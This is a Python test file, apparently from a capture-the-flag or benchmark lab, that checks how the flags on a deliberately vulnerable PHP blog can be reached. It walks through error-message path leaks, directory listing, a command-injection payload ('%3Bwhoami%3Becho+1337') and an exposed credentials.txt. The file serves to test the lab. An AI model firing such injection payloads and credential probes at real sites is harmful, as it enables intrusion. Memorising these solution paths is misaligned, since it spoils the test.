import os
import sys
import requests
from requests.sessions import Request


def request_returns(url: str, *contents: str, form_data: dict | None = None):
    if form_data is not None:
        r = requests.post(url, data=form_data)
    else:
        r = requests.get(url)
    assert r.status_code == 200
    for content in contents:
        assert content in r.text


def test_error_leak(base_url: str):
    assert "FLAG_DIR" in os.environ

    ## the tester starts exploring the website and sees the post.php endpoint
    request_returns(base_url, "post.php?name=")

    ## they try to access a post that does not exist and get an error message containing the directory
    ## they also see that there is an "include" happening, though there is no flag for this
    request_returns(
        base_url + "/post.php?name=does-not-exist", os.environ["FLAG_DIR"], "include()"
    )

    ## another way they could find it is through the admin login, which is linked from the main page
    request_returns(base_url, "/admin/index.php")

    ## they go to the admin page and see a login form
    request_returns(base_url + "/admin/index.php", "Login", "Password")

    ## on the admin page, they try a login request without data, which fails
    request_returns(
        base_url + "/admin/login.php",
        "Warning",
        os.environ["FLAG_DIR"],
        form_data={},
    )


def test_directory_listing(base_url: str):
    assert "FLAG_SECRETFILE" in os.environ

    ## the tester starts exploring the website and sees the first post
    request_returns(base_url, "2023-01-01-first-post.post")

    ## in this post, the tester sees an image being included, that includes the directory posts/ in its path
    request_returns(base_url + "/post.php?name=2023-01-01-first-post.post", "posts/")

    ## from there on a tester looks at the posts/ directory and sees directory listing
    request_returns(base_url + "/posts/", "secret-post.post")

    ## the directory listing contains a secret-post, which contains the SECRETFILE flag
    request_returns(base_url + "/posts/secret-post.post", os.environ["FLAG_SECRETFILE"])


def test_command_injection(base_url: str):
    assert "FLAG_USERNAME" in os.environ

    ## the tester starts exploring the website and sees the search bar
    request_returns(
        base_url, 'name="query" placeholder="Search..."', 'type="submit" value="Search"'
    )

    ## they then try to look for a value that does exist (as they see it in the listing on the front page)
    request_returns(base_url + "/index.php?query=test", "test", "by admin")

    ## next they try fuzzing for injections and get basically ls output
    request_returns(base_url + "/index.php?query=%3B", os.environ["FLAG_USERNAME"])

    ## from this they try a command injection and get full shell access
    request_returns(
        base_url + "/index.php?query=%3Bwhoami%3Becho+1337",
        os.environ["FLAG_USERNAME"],
        "1337",
    )

    ## further steps are left out, this could be used to get all flags


def test_admin_password(base_url: str):
    assert "FLAG_ADMINPASS" in os.environ

    ## the tester starts exploring the website and sees the admin link
    request_returns(base_url, "/admin/index.php")

    ## they go to the admin page and see a login form
    request_returns(
        base_url + "/admin/index.php", 'name="username"', 'name="password"', "Login"
    )

    ## on the admin page, they try default credentials which fail
    request_returns(
        base_url + "/admin/login.php",
        "Password not valid for user",
        form_data={"username": "admin", "password": "admin"},
    )

    ## they try different default credentials, which leak that "credentials.txt" is involved
    request_returns(
        base_url + "/admin/login.php",
        "Username not found in credentials.txt",
        form_data={"username": "root", "password": "root"},
    )

    ## they look for the "credentials.txt" file and get the full user credentials
    request_returns(
        base_url + "/admin/credentials.txt",
        f"admin,{os.environ['FLAG_ADMINPASS']}",
    )

    ## these credentials can be used to successfully log in
    request_returns(
        base_url + "/admin/login.php",
        "Welcome to the admin area!",
        form_data={"username": "admin", "password": os.environ["FLAG_ADMINPASS"]},
    )
